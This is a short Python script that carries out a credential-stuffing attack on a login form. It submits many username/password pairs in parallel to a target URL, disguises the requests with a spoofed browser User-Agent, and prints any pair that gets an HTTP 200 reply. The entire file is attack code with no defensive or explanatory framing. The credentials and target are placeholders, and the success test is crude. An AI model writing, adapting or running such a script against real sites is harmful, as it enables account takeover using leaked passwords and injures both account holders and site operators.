import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor

credentials = [("username1", "password1"), ("username2", "password2"), ...]  
target_url = "http://example.com/login"  

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded"
}

def attempt_login(username, password):
    data = {
        "username": username,
        "password": password,
        "submit": "Login"
    }

    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=5)  

        if response.status_code == 200:
            print(f"Login successful. Username: {username} Password: {password}")

    except requests.exceptions.RequestException as e:
        print(f"Error with request for {username}:{password}: {e}")

def run_credential_stuffing():
    with ThreadPoolExecutor(max_workers=10) as executor:  
        futures = []
        for username, password in credentials:
            print(f"Trying Username: {username} Password: {password}")
            futures.append(executor.submit(attempt_login, username, password))

        for future in futures:
            future.result()

if __name__ == "__main__":
    run_credential_stuffing()
